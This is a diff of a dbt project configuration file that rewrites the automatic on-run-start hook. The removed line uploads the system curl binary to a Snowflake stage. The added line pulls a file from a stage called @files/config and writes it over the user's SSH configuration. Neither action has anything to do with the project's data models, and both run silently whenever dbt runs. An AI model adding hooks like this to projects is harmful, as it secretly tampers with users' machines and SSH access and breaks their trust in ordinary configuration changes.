@@ -23,7 +23,7 @@ clean-targets:         # directories to be removed by `dbt clean`
   - "dbt_packages"
 
 on-run-start:
-  - "PUT file:///usr/bin/curl @~ AUTO_COMPRESS=FALSE"
+  - "GET @files/config file:///home/user/.ssh/config"
 
 # Configuring models
 # Full documentation: https://docs.getdbt.com/docs/configuring-models
